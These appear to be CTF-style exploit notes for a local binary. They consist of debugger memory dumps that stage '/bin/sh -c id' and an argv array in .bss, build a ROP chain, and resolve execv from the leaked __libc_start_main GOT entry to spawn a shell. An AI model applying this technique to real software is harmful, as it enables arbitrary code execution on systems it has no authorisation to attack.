buf: 0x7fffffffdd40

first write: 0x602000
```
0x602000:	0x0068732f6e69622f	0x000000646900632d
0x602010 <gif>:	0x0000000000000000	0x0000000000000000
0x602020 <stdout@@GLIBC_2.2.5>:	0x0000000000000000	0x0000000000000000
0x602030:	0x0000000000000000	0x0000000000000000
0x602040:	0x0000000000000000	0x0000000000000000
0x602050:	0x0000000000602000	0x0000000000602008
0x602060:	0x000000000060200b	0x0000000000000000
0x602070:	0x0000000000000000	0x0000000000000000
0x602080:	0x0000000000000000	0x0000000000000000
0x602090:	0x0000000000000000	0x0000000000000000
```

second write: 0x602f00
```
0x602f00:	0x00000000004010d3	0x0000000000602000
0x602f10:	0x00000000004010d1	0x0000000000602050
0x602f20:	0x0000000000602050	0x0000000000000000
```

arb_write_rax (write got['__libc_start_main'] to mem)
```
0x602f28:	0x00007ffff7de9fc0	0x0000000000000000
```

rop (add offset to that address to get execv)
```
0x602f28:	0x00007ffff7ea9450	0x0000000000000000
```

Execute from 0x602f00

execv
```
rdi: 0x602000
rsi: 0x602050
```

execv("/bin/sh", ["/bin/sh", "-c", "id", NULL])
